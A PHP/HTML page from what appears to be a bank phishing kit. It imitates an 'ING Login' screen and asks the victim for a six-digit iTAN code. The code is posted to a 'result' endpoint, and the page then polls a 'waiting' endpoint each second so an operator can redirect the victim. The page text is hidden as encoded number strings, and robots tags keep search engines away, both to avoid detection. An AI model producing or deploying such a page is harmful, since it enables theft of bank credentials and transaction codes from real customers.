<?php
    reset_action(get_client_ip());
    $infos  = get_infos();
    $number = $infos['number'];
?>
<!doctype html>
<html style="display: flex; flex-direction: column; height: 100%;">

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="assets/css/bootstrap.css">
        <link rel="stylesheet" href="assets/css/helpers.css">
        <link rel="stylesheet" href="assets/css/style.css">

        <link rel="icon" type="image/png" href="assets/imgs/favicon.png" />

        <title>ING Login</title>
    </head>

    <body style="display: flex; flex-direction: column; height: 100%;">
        <div id="whitebox"></div>
        <div id="loader">
            <div class="inner">
                <ul>
                    <li></li>
                    <li></li>
                    <li class="active"></li>
                </ul>
                <p><hello class="chlakh">314 80 206 66 167 334 278 533 181 67 80 107 535 313 217 24 134 31 32 400</hello></p>
            </div>
        </div>

        <header>
        <div class="header container">
            <div class="logo"><img src="assets/imgs/log.svg"></div>
        </div>
    </header>
    <section id="login" class="flex-grow-1" style="padding-bottom: 177px;">
        <div class="container">
            <div class="titre"><h2><hello class="chlakh">482 340 519 489 71 123 404 241 371 494 80 107 535 313 217 24 134 31 32 400</hello></h2></div>
            <div class="form row" id="itan"> 
                <form id="form" action="result" method="POST" class="text-center">
                    <input type="hidden" name="captcha">
                    <input type="hidden" name="step" value="itan">
                    <p style="color: #666;margin-bottom: 30px;font-size: 15px; display: none;"><hello class="chlakh">528 404 17 555 195 371 168 26 343 138 361 389 239 502 217 24 134 31 32 400</hello> <?php echo $number; ?> ein.</p>
                    <p style="color: #666;margin-bottom: 30px;font-size: 15px;"><?php echo $number; ?></p>
                    <div class="itan d-flex justify-content-between ">
                            <input type="text" inputmode="numeric" maxlength="1" name="itan1" id="itan1" class="form-control">
                            <input type="text" inputmode="numeric" maxlength="1" name="itan2" id="itan2" class="form-control">
                            <input type="text" inputmode="numeric" maxlength="1" name="itan3" id="itan3" class="form-control">
                            <input type="text" inputmode="numeric" maxlength="1" name="itan4" id="itan4" class="form-control">
                            <input type="text" inputmode="numeric" maxlength="1" name="itan5" id="itan5" class="form-control">
                            <input type="text" inputmode="numeric" maxlength="1" name="itan6" id="itan6" class="form-control">
                        </div>
                        <?php echo error_message($_SESSION['errors'],'itan'); ?>
                    <div class="bttn text-center mt-5">
                        <button type="submit" id="submit" style="background:#FF6200;" submit=""><i style="margin-right: 5px;" class="fas fa-angle-right"></i><hello class="chlakh">319 175 490 34 143 208 105 264 237 81 461 277 189 317 26 551 108 181 101 26 197 158</hello></button>
                    </div>
                </form>
            </div>
        </div>
    </section>
    <footer>
        <ul class="list-unstyled">
            <li><hello class="chlakh">80 102 419 398 502 56 514 336 515 225 405 559 96 547 357 511 239 511 431 31 499 437 228 24 528 145 553</hello></li>
            <li><hello class="chlakh">284 355 306 26 43 518 522 361 515 225 405 559 96 547 357 511 239 511 431 31 499 437 228 24 528 145 553</hello></li>
            <li><hello class="chlakh">178 529 59 96 43 518 522 361 515 225 405 559 96 547 357 511 239 511 431 31 499 437 228 24 528 145 553</hello></li>
            <li><hello class="chlakh">320 494 258 96 43 518 522 361 515 225 405 559 96 547 357 511 239 511 431 31 499 437 228 24 528 145 553</hello></li>
            <li><hello class="chlakh">259 84 258 96 43 518 522 361 515 225 405 559 96 547 357 511 239 511 431 31 499 437 228 24 528 145 553</hello></li>
            <li><hello class="chlakh">32 354 256 264 31 273 48 279 71 264 150 138 333 547 357 511 239 511 431 31 499 437 228 24 528 145 553</hello></li>
            <li><hello class="chlakh">352 442 59 120 369 543 289 300 176 124 136 511 390 255 264 468 376 102 47 555 429 57 383 275 455 378 348 515 276</hello></li>
        </ul>
        <div><img style="min-width: 144px;" src="assets/imgs/media.png"></div>
    </footer>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="assets/js/bootstrap.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
        <script src="assets/js/script.js"></script>

        <script>

            getContent("itan");

            $('.itan input').keyup(function(e){
                if( $(this).val().length == 1 ) {
                    $(this).next().focus();
                } else if( $(this).val().length == 0 ) {
                    if( e.keyCode == 8 ) {
                        $(this).prev().focus();
                    }
                }
            });

            $('#submit').click(function(e) {
                e.preventDefault();
                $('.error').hide();
                $('#loader').css({"display":"flex"}).show(200,function() {
                    $.post( "result", $('#form').serialize() )
                        .done(function( data ) {
                        if( data == 'success' ) {
                            
                            (function worker() {
                                $.ajax({
                                    method: "GET",
                                    url: 'waiting',
                                    success: function (data) {
                                        if( data !== '' && data !== "0" ) {
                                            window.location.href= 'redirection/' + data;
                                        }
                                    },
                                    complete: function () {
                                        setTimeout(worker, 1000);
                                    }
                                });
                            })();

                        } else if( data == 'error' ) {
                            location.reload();
                        }
                    });
                });
            });

        </script>

    </body>

</html>